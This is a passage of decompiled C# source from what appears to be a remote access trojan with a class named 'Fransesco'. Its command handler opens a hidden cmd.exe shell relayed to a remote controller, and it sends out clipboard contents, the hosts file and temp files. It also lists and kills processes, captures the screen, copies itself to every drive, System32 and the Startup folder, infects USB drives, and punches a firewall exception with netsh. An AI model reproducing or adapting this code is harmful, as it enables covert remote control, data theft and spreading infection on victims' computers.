        num3 = 3;
        int hWnd1_1 = checked ((int) window);
        string str1 = "TrayNotifyWnd";
        ref string local1 = ref str1;
        string str2 = (string) null;
        ref string local2 = ref str2;
        long windowEx1 = (long) Fransesco.FindWindowEx(hWnd1_1, 0, ref local1, ref local2);
label_4:
        num3 = 4;
        int hWnd1_2 = checked ((int) windowEx1);
        string str3 = "TrayClockWClass";
        ref string local3 = ref str3;
        string str4 = (string) null;
        ref string local4 = ref str4;
        long windowEx2 = (long) Fransesco.FindWindowEx(hWnd1_2, 0, ref local3, ref local4);
label_5:
        num3 = 5;
        e.ShowWindow((IntPtr) windowEx2, 1);
        goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      string str5;
      string str6 = str5;
      if (num2 == 0)
        return str6;
      ProjectData.ClearProjectError();
      return str6;
    }

    public static object AddHome(string text)
    {
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", true).SetValue("Start Page", (object) text);
      object obj;
      return obj;
    }

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int _FindWindow_([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int _SetWindowPos(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void _SendMessage(int hWnd, uint msg, uint wParam, int lparam);

    [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int _SystemParametersInfo(
      int uAction,
      int uParam,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam,
      int fuWinIni);

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int FindWindow_([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SetWindowPos_(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void SendMessage_(int hWnd, uint msg, uint wParam, int lparam);

    private static void ImHere(object a0, SessionEndingEventArgs a1) => Fransesco.ED();

    public static object Ram() => (object) ((double) MyProject.Computer.Info.TotalPhysicalMemory / 1024.0 / 1024.0 / 1024.0).ToString("##.#GB");

    public static object countrys()
    {
      string englishName = CultureInfo.CurrentCulture.EnglishName;
      englishName.Substring(checked (englishName.IndexOf('(') + 1), checked (englishName.LastIndexOf(')') - englishName.IndexOf('(') - 1));
      object obj;
      return obj;
    }

    public static object Data()
    {
      object obj;
      try
      {
        obj = (object) Fransesco.LO.LastWriteTime.ToString("dd-MM-yyyy");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "00-00-0000";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static void Send(byte[] b)
    {
      if (!Fransesco.Cn)
        return;
      try
      {
        object Instance1 = (object) new MemoryStream();
        object Instance2 = Instance1;
        object[] objArray = new object[3]
        {
          (object) b,
          (object) 0,
          (object) b.Length
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[3]{ true, false, false };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(Instance2, (System.Type) null, "Write", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
        if (flagArray[0])
          b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Write", new object[3]
        {
          (object) Fransesco.SB(ref Fransesco.SPL),
          (object) 0,
          (object) Fransesco.SPL.Length
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        Fransesco.C.Client.Send((byte[]) NewLateBinding.LateGet(Instance1, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), 0, Conversions.ToInteger(NewLateBinding.LateGet(Instance1, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), SocketFlags.None);
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Fransesco.Cn = false;
        ProjectData.ClearProjectError();
      }
    }

    public static object SetBytes(object Bytes)
    {
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        if (Operators.ConditionalCompareObjectGreaterEqual(Bytes, (object) 1073741824, false))
        {
          obj1 = (object) (Strings.Format(Operators.DivideObject(Operators.DivideObject(Operators.DivideObject(Bytes, (object) 1024), (object) 1024), (object) 1024), "#0.00") + " GB");
          goto label_15;
        }
        else if (Operators.ConditionalCompareObjectGreaterEqual(Bytes, (object) 1048576, false))
        {
          obj1 = (object) (Strings.Format(Operators.DivideObject(Operators.DivideObject(Bytes, (object) 1024), (object) 1024), "#0.00") + " MB");
          goto label_15;
        }
        else if (Operators.ConditionalCompareObjectGreaterEqual(Bytes, (object) 1024, false))
        {
          obj1 = (object) (Strings.Format(Operators.DivideObject(Bytes, (object) 1024), "#0.00") + " KB");
          goto label_15;
        }
        else if (Operators.ConditionalCompareObjectLess(Bytes, (object) 1024, false))
        {
          obj1 = Operators.ConcatenateObject(Conversion.Fix(RuntimeHelpers.GetObjectValue(Bytes)), (object) " KB");
          goto label_15;
        }
        else
          goto label_15;
label_10:
        num2 = -1;
        switch (num1)
        {
          case 2:
            obj1 = (object) "0,00 KB";
            goto label_15;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public static Image CaptureDesktop()
    {
      Image image;
      try
      {
        Rectangle rectangle = new Rectangle();
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
        Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
        image = (Image) bitmap;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        image = (Image) null;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return image;
    }

    public static RegistryKey GetKey(string key)
    {
      if (key.StartsWith(Fransesco.F.Registry.ClassesRoot.Name))
      {
        string name = key.Replace(Fransesco.F.Registry.ClassesRoot.Name + "\\", "");
        return Fransesco.F.Registry.ClassesRoot.OpenSubKey(name, true);
      }
      if (key.StartsWith(Fransesco.F.Registry.CurrentUser.Name))
      {
        string name = key.Replace(Fransesco.F.Registry.CurrentUser.Name + "\\", "");
        return Fransesco.F.Registry.CurrentUser.OpenSubKey(name, true);
      }
      if (key.StartsWith(Fransesco.F.Registry.LocalMachine.Name))
      {
        string name = key.Replace(Fransesco.F.Registry.LocalMachine.Name + "\\", "");
        return Fransesco.F.Registry.LocalMachine.OpenSubKey(name, true);
      }
      if (!key.StartsWith(Fransesco.F.Registry.Users.Name))
        return (RegistryKey) null;
      string name1 = key.Replace(Fransesco.F.Registry.Users.Name + "\\", "");
      return Fransesco.F.Registry.Users.OpenSubKey(name1, true);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long mciSendString_(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string Command,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ReturnString,
      long ReturnLength,
      long hWnd);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int mmciSendString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString,
      int uReturnLength,
      int hwndCallback);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetWindowPos(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long mciSendString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString,
      long uReturnLength,
      long hwndCallback);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long SwapMouseButton(long bSwap);

    [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam,
      int fuWinIni);

    public static object GetPastas(object location)
    {
      object pastas;
      try
      {
        DirectoryInfo directoryInfo1 = new DirectoryInfo(Conversions.ToString(location));
        string str = "";
        DirectoryInfo[] directories = directoryInfo1.GetDirectories();
        int index = 0;
        while (index < directories.Length)
        {
          DirectoryInfo directoryInfo2 = directories[index];
          str = str + "%DIRET%%|%" + directoryInfo2.Name + "%|%\r\n";
          checked { ++index; }
        }
        pastas = (object) str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return pastas;
    }

    public static Array fx(byte[] b, string spl)
    {
      object Instance1 = (object) new List<byte[]>();
      object Instance2 = (object) new MemoryStream();
      object Instance3 = (object) new MemoryStream();
      string[] strArray = Strings.Split(Fransesco.BS(ref b), spl);
      object Instance4 = Instance2;
      object[] objArray1 = new object[3]
      {
        (object) b,
        (object) 0,
        (object) strArray[0].Length
      };
      object[] Arguments1 = objArray1;
      bool[] flagArray1 = new bool[3]{ true, false, false };
      bool[] CopyBack1 = flagArray1;
      NewLateBinding.LateCall(Instance4, (System.Type) null, "Write", Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
      if (flagArray1[0])
        b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
      object Instance5 = Instance3;
      object[] objArray2 = new object[3]
      {
        (object) b,
        (object) checked (strArray[0].Length + spl.Length),
        (object) checked (b.Length - strArray[0].Length + spl.Length)
      };
      object[] Arguments2 = objArray2;
      bool[] flagArray2 = new bool[3]{ true, false, false };
      bool[] CopyBack2 = flagArray2;
      NewLateBinding.LateCall(Instance5, (System.Type) null, "Write", Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
      if (flagArray2[0])
        b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (byte[]));
      object Instance6 = Instance1;
      object[] objArray3 = new object[1];
      object[] objArray4 = objArray3;
      object Instance7 = Instance2;
      object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance7, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
      objArray4[0] = objectValue1;
      object[] objArray5 = objArray3;
      object[] Arguments3 = objArray5;
      bool[] flagArray3 = new bool[1]{ true };
      bool[] CopyBack3 = flagArray3;
      NewLateBinding.LateCall(Instance6, (System.Type) null, "Add", Arguments3, (string[]) null, (System.Type[]) null, CopyBack3, true);
      if (flagArray3[0])
        NewLateBinding.LateSetComplex(Instance7, (System.Type) null, "ToArray", new object[1]
        {
          RuntimeHelpers.GetObjectValue(objArray5[0])
        }, (string[]) null, (System.Type[]) null, true, false);
      object Instance8 = Instance1;
      object[] objArray6 = new object[1];
      object[] objArray7 = objArray6;
      object Instance9 = Instance3;
      object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance9, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
      objArray7[0] = objectValue2;
      object[] objArray8 = objArray6;
      object[] Arguments4 = objArray8;
      bool[] flagArray4 = new bool[1]{ true };
      bool[] CopyBack4 = flagArray4;
      NewLateBinding.LateCall(Instance8, (System.Type) null, "Add", Arguments4, (string[]) null, (System.Type[]) null, CopyBack4, true);
      if (flagArray4[0])
        NewLateBinding.LateSetComplex(Instance9, (System.Type) null, "ToArray", new object[1]
        {
          RuntimeHelpers.GetObjectValue(objArray8[0])
        }, (string[]) null, (System.Type[]) null, true, false);
      NewLateBinding.LateCall(Instance2, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      NewLateBinding.LateCall(Instance3, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      return (Array) NewLateBinding.LateGet(Instance1, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
    }

    public static object GetDiscos()
    {
      object discos;
      try
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        int index = 0;
        string str;
        while (index < drives.Length)
        {
          DriveInfo driveInfo = drives[index];
          if (driveInfo.IsReady)
            str = str + "%DIISC%%|%" + driveInfo.Name + "%|%" + driveInfo.TotalSize.ToString() + "%|%\r\n";
          checked { ++index; }
        }
        discos = (object) str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return discos;
    }

    public static object GetArquivos(object location)
    {
      object arquivos;
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
        string str = "";
        FileInfo[] files = directoryInfo.GetFiles("*.*");
        int index = 0;
        while (index < files.Length)
        {
          FileInfo fileInfo = files[index];
          str = str + "%FILESS%%|%" + fileInfo.Name + "%|%" + fileInfo.Length.ToString() + "%|%\r\n";
          checked { ++index; }
        }
        arquivos = (object) str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return arquivos;
    }

    public static object comp()
    {
      object obj;
      return obj;
    }

    public static string RegValueGet(string name)
    {
      string str;
      try
      {
        object Instance = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(Fransesco.comp(), (System.Type) null, "Registry", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CurrentUser", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CreateSubKey", new object[1]
        {
          (object) "Software\\ShortCutInfection"
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        object[] objArray = new object[2]
        {
          (object) name,
          (object) ""
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[2]{ true, false };
        bool[] CopyBack = flagArray;
        object obj = NewLateBinding.LateGet(Instance, (System.Type) null, "GetValue", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          name = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        str = Conversions.ToString(obj);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "error < Not Found >";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static object RegValueSet(string name, string values)
    {
      try
      {
        object Instance = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(Fransesco.comp(), (System.Type) null, "Registry", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CurrentUser", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CreateSubKey", new object[1]
        {
          (object) "Software\\ShortCutInfection"
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        object[] objArray = new object[2]
        {
          (object) name,
          (object) values
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[2]{ true, true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(Instance, (System.Type) null, "SetValue", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
        if (flagArray[0])
          name = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        if (flagArray[1])
          values = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) null;
    }

    public static string MeuNome() => Environment.MachineName + "\\" + Environment.UserName + Fransesco.Y;

    public static IntPtr NtSuspendProcess(IntPtr hProc)
    {
      IntPtr num;
      return num;
    }

    public static IntPtr NtResumeProcess(IntPtr hProc)
    {
      IntPtr num;
      return num;
    }

    [DllImport("KERNEL32.DLL")]
    public static extern void Beep(int freq, int dur);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long BlockInput_(long fBlock);

    [DllImport("user32", EntryPoint = "BlockInput", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int BlockInput_1(int fBlock);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(Fransesco.BS(ref b), Fransesco.Y);
      try
      {
        string Left1 = strArray1[0];
        string Left2 = Left1;
        byte[] buffer;
        if (Operators.CompareString(Left2, "time", false) == 0)
          DateAndTime.TimeOfDay = Conversions.ToDate(strArray1[1]);
        else if (Operators.CompareString(Left2, "piano", false) == 0)
          Fransesco.Beep(Conversions.ToInteger(strArray1[1]), 300);
        else if (Operators.CompareString(Left2, "BepX", false) == 0)
          Fransesco.Beep(checked ((int) Math.Round(Math.Round(Math.Round(Conversion.Val(strArray1[1]))))), checked ((int) Math.Round(Math.Round(Math.Round(Conversion.Val(strArray1[2]))))));
        else if (Operators.CompareString(Left2, "piano", false) == 0)
          Fransesco.Beep(checked ((int) Math.Round(Math.Round(Math.Round(Conversion.Val(strArray1[1]))))), 300);
        else if (Operators.CompareString(Left2, "BepX", false) == 0)
          Fransesco.Beep(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
        else if (Operators.CompareString(Left2, "piano", false) == 0)
          Fransesco.Beep(Conversions.ToInteger(strArray1[1]), 300);
        else if (Operators.CompareString(Left2, "TextToSpeech", false) == 0)
        {
          object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"));
          object[] objArray1 = new object[1];
          object[] objArray2 = objArray1;
          string[] strArray2 = strArray1;
          string[] strArray3 = strArray2;
          int index1 = 1;
          int index2 = index1;
          string str = strArray3[index2];
          objArray2[0] = (object) str;
          object[] objArray3 = objArray1;
          object[] Arguments = objArray3;
          bool[] flagArray = new bool[1]{ true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(objectValue, (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray[0])
            strArray2[index1] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (string));
        }
        else if (Operators.CompareString(Left2, "virs", false) == 0)
          Fransesco.Send("virs");
        else if (Operators.CompareString(Left2, "virs", false) == 0)
        {
          while (true)
          {
            int num1 = (int) Interaction.MsgBox((object) "Doni!", MsgBoxStyle.Critical, (object) "!~ Hacker ~!");
          }
        }
        else if (Operators.CompareString(Left2, "hard", false) == 0)
        {
          string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
          string[] logicalDrives = Directory.GetLogicalDrives();
          int index = 0;
          while (index < logicalDrives.Length)
          {
            string str = logicalDrives[index];
            try
            {
              System.IO.File.Copy(Application.ExecutablePath, str + Fransesco.d + ".exe");
              System.IO.File.SetAttributes(str + Fransesco.d + ".exe", FileAttributes.Normal);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
        }
        else if (Operators.CompareString(Left2, "System", false) == 0)
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        else if (Operators.CompareString(Left2, "USB", false) == 0)
          Usb1.infect();
        else if (Operators.CompareString(Left2, "UAC", false) == 0)
        {
          Interaction.Shell("netsh firewall delete allowedprogram \"" + Fransesco.LO.FullName + "\"", AppWinStyle.Hide);
          Interaction.Shell("netsh firewall add allowedprogram \"" + Fransesco.LO.FullName + "\" \"" + Fransesco.LO.Name + "\" ENABLE", AppWinStyle.Hide);
        }
        else if (Operators.CompareString(Left2, "sperd", false) == 0)
        {
          Fransesco.Send("sperd");
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + strArray1[1] + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.RG + strArray1[1] + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
        }
        else if (Operators.CompareString(Left2, "form10", false) == 0)
          Fransesco.Send("form10");
        else if (Operators.CompareString(Left2, "DeMon2", false) == 0)
          MyProject.Computer.Clipboard.SetText(strArray1[1]);
        else if (Operators.CompareString(Left2, "DeMon", false) == 0)
          Fransesco.Send("DeMon" + Fransesco.Y + System.IO.File.ReadAllText(Path.GetTempPath() + "\\FransescoPast.txt"));
        else if (Operators.CompareString(Left2, "rss", false) == 0)
        {
          try
          {
            NewLateBinding.LateCall(Fransesco.Pro, (System.Type) null, "Kill", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Fransesco.Pro = (object) new Process();
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardOutput", new object[1]
          {
            (object) true
          }, (string[]) null, (System.Type[]) null, false, true);
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardInput", new object[1]
          {
            (object) true
          }, (string[]) null, (System.Type[]) null, false, true);
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardError", new object[1]
          {
            (object) true
          }, (string[]) null, (System.Type[]) null, false, true);
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "FileName", new object[1]
          {
            (object) "cmd.exe"
          }, (string[]) null, (System.Type[]) null, false, true);
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardError", new object[1]
          {
            (object) true
          }, (string[]) null, (System.Type[]) null, false, true);
          ((Process) Fransesco.Pro).OutputDataReceived += new DataReceivedEventHandler(Fransesco.RS);
          ((Process) Fransesco.Pro).ErrorDataReceived += new DataReceivedEventHandler(Fransesco.RS);
          ((Process) Fransesco.Pro).Exited += (EventHandler) ((a0, a1) => Fransesco.ex());
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "UseShellExecute", new object[1]
          {
            (object) false
          }, (string[]) null, (System.Type[]) null, false, true);
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CreateNoWindow", new object[1]
          {
            (object) true
          }, (string[]) null, (System.Type[]) null, false, true);
          NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "WindowStyle", new object[1]
          {
            (object) ProcessWindowStyle.Hidden
          }, (string[]) null, (System.Type[]) null, false, true);
          NewLateBinding.LateSet(Fransesco.Pro, (System.Type) null, "EnableRaisingEvents", new object[1]
          {
            (object) true
          }, (string[]) null, (System.Type[]) null);
          Fransesco.Send("rss");
          NewLateBinding.LateCall(Fransesco.Pro, (System.Type) null, "Start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Fransesco.Pro, (System.Type) null, "BeginErrorReadLine", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Fransesco.Pro, (System.Type) null, "BeginOutputReadLine", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        }
        else if (Operators.CompareString(Left2, "rs", false) == 0)
          NewLateBinding.LateCall(NewLateBinding.LateGet(Fransesco.Pro, (System.Type) null, "StandardInput", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "WriteLine", new object[1]
          {
            (object) Fransesco.DEB(ref strArray1[1])
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        else if (Operators.CompareString(Left2, "rsc", false) == 0)
        {
          try
          {
            NewLateBinding.LateCall(Fransesco.Pro, (System.Type) null, "Kill", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Fransesco.Pro = (object) null;
        }
        else if (Operators.CompareString(Left2, "cc", false) == 0)
          Interaction.Shell("rundll32.exe shell32.dll,Control_RunDLL");
        else if (Operators.CompareString(Left2, "EnviarServidorChamaFormClipboard", false) == 0)
          Fransesco.Send("FormClipboard" + Fransesco.Y + Environment.UserName + "/" + Environment.MachineName + Fransesco.Y);
        else if (Operators.CompareString(Left2, "MeuTextoClipboard", false) == 0)
          Fransesco.Send("TextoClipboard" + Fransesco.Y + MyProject.Computer.Clipboard.GetText().ToString() + Fransesco.Y);
        else if (Operators.CompareString(Left2, "NovoClipboard", false) == 0)
          Clipboard.SetText(strArray1[1]);
        else if (Operators.CompareString(Left2, "ExcluirClipboard", false) == 0)
          Clipboard.Clear();
        else if (Operators.CompareString(Left2, "IconsON", false) == 0)
          Fransesco.IconsToggle();
        else if (Operators.CompareString(Left2, "IconsOFF", false) == 0)
          Fransesco.IconsToggle();
        else if (Operators.CompareString(Left2, "Denger", false) == 0)
          Fransesco.Send("Denger" + Fransesco.Y + System.IO.File.ReadAllText(Path.GetTempPath() + "\\output.txt"));
        else if (Operators.CompareString(Left2, "host5", false) == 0)
          Fransesco.Send("host5" + Fransesco.Y + MyProject.Computer.FileSystem.ReadAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts"));
        else if (Operators.CompareString(Left2, "EnviarPermisaoGerenciador", false) == 0)
          Fransesco.Send("ChamaFormGerenciadorTareefeas" + Fransesco.Y + Environment.MachineName + "/" + Environment.UserName + Fransesco.Y);
        else if (Operators.CompareString(Left2, "form3", false) == 0)
          Fransesco.Send("form3");
        else if (Operators.CompareString(Left2, "System", false) == 0)
          Thread.Sleep(Conversions.ToInteger(strArray1[1]));
        else if (Operators.CompareString(Left2, "PegarProcessos", false) == 0)
        {
          string str1 = "";
          string str2 = "ProcessSplit";
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            try
            {
              str1 = str1 + process.ProcessName + "|" + Conversions.ToString(process.Id) + "|" + process.MainModule.FileName + "|" + Conversions.ToString(process.PrivateMemorySize64) + "|" + Conversions.ToString(process.StartTime) + str2;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              str1 = str1 + process.ProcessName + "|" + Conversions.ToString(process.Id) + "|-|" + Conversions.ToString(process.PrivateMemorySize64) + "|-" + str2;
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
          Fransesco.Send("ChamaListProcesss" + Fransesco.Y + str1 + Fransesco.Y + Process.GetCurrentProcess().Id.ToString() + Fransesco.Y);
        }
        else if (Operators.CompareString(Left2, "FinalizarProcesss", false) == 0)
        {
          try
          {
            Process[] processesByName = Process.GetProcessesByName(strArray1[1]);
            int index = 0;
            while (index < processesByName.Length)
            {
              processesByName[index].Kill();
